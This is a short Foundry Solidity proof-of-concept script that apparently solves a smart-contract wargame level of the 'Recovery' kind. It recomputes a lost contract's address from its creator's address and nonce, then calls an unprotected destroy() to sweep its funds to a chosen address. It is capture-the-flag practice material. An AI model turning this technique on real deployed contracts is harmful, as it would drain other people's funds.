// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/Ilevel17.sol";

contract POC is Script {
    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        address payable lostcontract = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(0xd89bEAe5D371Bc79754623f7f789a395F3D83b3C),
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        SimpleToken level15 = SimpleToken(lostcontract);
        level15.destroy(0xEAce4b71CA1A128e8B562561f46896D55B9B0246);

        vm.stopBroadcast();
    }
}
